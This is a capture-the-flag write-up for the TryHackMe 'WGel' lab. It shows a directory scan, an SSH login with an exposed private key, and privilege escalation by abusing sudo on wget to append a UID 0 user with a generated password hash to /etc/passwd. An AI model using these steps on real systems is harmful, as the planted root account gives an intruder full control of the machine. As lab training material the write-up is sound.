# WGel

## Getting access

On the main page, in the comments we find a possible username: *Jessie*

Running a gobuster scan we find the page /sitemap
Running another one on this subdir we find /.ssh where we find a private key, presumably Jessie's

```bash
$ gobuster dir -u http://10.10.237.120/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
$ gobuster dir -u http://10.10.237.120/sitemap/ -w /usr/share/wordlists/dirb/common.txt | tee gob_scan3
```

```bash
kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Wget_CTF_IN_PROGRESS$ touch rsa_private
kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Wget_CTF_IN_PROGRESS$ chmod 600 rsa_private 
kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Wget_CTF_IN_PROGRESS$ vim rsa_private
kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Wget_CTF_IN_PROGRESS$ ssh -i rsa_private jessie@10.10.237.120
```

Jessie with uppercase first letter did not work as a username, but *jessie* did.


## PrivEsc

Running *sudo -l*, we find the wget has 

```bash
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

We can use this to edit /etc/passwd

We could append a new user with UID 0 and a password of our choice
Generate the password:
```bash
kali@kali:~/Desktop/CTF-Write-ups/TryHackMe/Wget_CTF_IN_PROGRESS$ openssl passwd -1 -salt ceva parola12345
$1$ceva$gx3eJeje67jXAHOlUosqd1
```
Append this entry to /etc/passwd

```bash
ruski:$1$ceva$gx3eJeje67jXAHOlUosqd1:0:0:root/root:/bin/bash
```

Then su into the created user.